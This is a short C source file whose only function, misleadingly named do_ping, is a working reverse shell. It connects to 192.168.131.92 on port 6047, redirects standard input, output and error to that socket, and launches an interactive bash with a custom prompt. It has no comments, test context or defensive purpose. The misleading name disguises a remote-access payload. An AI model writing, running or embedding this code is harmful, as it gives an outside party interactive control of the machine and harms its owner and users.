#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

void do_ping() {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_port = htons(6047);
    inet_pton(AF_INET, "192.168.131.92", &a.sin_addr);
    connect(s, (struct sockaddr*)&a, sizeof(a));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
    setenv("TERM", "xterm", 1);
    setenv("PS1", "john\$ ", 1);
    execl("/bin/bash", "bash", "--norc", "--noprofile", "-i", NULL);
    _exit(1);
}
